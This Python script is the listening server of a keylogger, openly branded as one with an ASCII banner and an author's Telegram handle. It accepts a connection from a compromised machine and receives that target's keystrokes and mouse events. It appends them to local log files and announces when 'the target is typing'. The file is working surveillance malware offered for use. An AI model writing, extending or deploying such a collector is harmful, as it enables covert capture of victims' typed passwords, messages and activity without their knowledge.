import socket
from colorama import Fore , init
import os
import time
init()
os.system("clear" or "cls")

print(Fore.CYAN+"""

******************************************************************************************************
*                                                                                                    *    
*     ,dPYb,                                                                                         *
*     IP'`Yb                                                                                         *
*     I8  8I                                                                                         *
*     I8  8bgg,                                                                                      *
*     I8 dP" "8   ,ggg,   gg     gg   ,ggg,,ggg,,ggg,     ,ggggg,    gg      gg    ,g,      ,ggg,    *
*     I8d8bggP"  i8" "8i  I8     8I  ,8" "8P" "8P" "8,   dP"  "Y8ggg I8      8I   ,8'8,    i8" "8i   * 
*     I8P' "Yb,  I8, ,8I  I8,   ,8I  I8   8I   8I   8I  i8'    ,8I   I8,    ,8I  ,8'  Yb   I8, ,8I   * 
*    ,d8    `Yb, `YbadP' ,d8b, ,d8I ,dP   8I   8I   Yb,,d8,   ,d8'  ,d8b,  ,d8b,,8'_   8)  `YbadP'   *
*    88P      Y8888P"Y888P""Y88P"8888P'   8I   8I   `Y8P"Y8888P"    8P'"Y88P"`Y8P' "YY8P8P888P"Y888  *
*                              ,d8I'                                                                 *
*                            ,dP'8I                                                                  *
*                           ,8"  8I                                                                  *
*                           I8   8I                                                                  *
*                           `8, ,8I                                                                  *
*                            `Y8P"                                                                   *
*                                                                                                    *
******************************************************************************************************

"""+Fore.RESET)

print(Fore.LIGHTBLACK_EX+"""
####################################################################################
#                                                                                  #
#                          coded by: Black Darck                                   #
#                          version : 1.0                                           #
#                          telegram : BlackDarck36                                 #
#                                                                                  #
####################################################################################
"""+Fore.RESET)


ip =input(Fore.LIGHTRED_EX+str("enter your ip :")+Fore.RESET)


s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.bind((ip , 4454))
s.listen(3)

c , addr = s.accept()

print(addr)

while True :
    data = c.recv(123456).decode()
    if data[0] == "m":
        data = data[1:]
        open("mouse.txt","a").write(data)
    elif data[0] == "k":
         data = data[1:]
         open("keyloger.txt","a").write(data)   
         print(Fore.GREEN+"[+]"+Fore.YELLOW+" The target is typing"+Fore.RESET)

c.close()         
